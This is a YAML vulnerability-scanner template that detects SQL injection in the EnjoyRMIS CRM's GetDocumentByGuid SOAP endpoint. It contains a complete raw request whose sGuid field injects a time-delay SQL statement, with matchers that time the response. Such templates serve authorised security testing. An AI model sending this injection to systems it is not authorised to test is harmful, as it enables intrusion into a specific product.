folder-5/poc-yaml-enjoyrmis-getdocumentbyguid-sqli.yaml

id: enjoyrmis-getdocumentbyguid-sqli

info:
  name: EnjoyRMIS GetDocumentByGuid SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects a SQL injection vulnerability in the EnjoyRMIS CRM system's GetDocumentByGuid endpoint.

variables:
  t1: '{{rand_int(3,8)}}'
  t2: '{{to_number(t1) + 2}}'

http:
  - raw:
      - |
        POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetDocumentByGuid"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetDocumentByGuid xmlns="http://tempuri.org/">
              <sGuid>1';WAITFOR DELAY '0:0:{{t1}}'--</sGuid>
            </GetDocumentByGuid>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "GetDocumentByGuidResponse"
          - "name="
          - "base="
      - type: word
        part: header
        words:
          - "text/xml"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
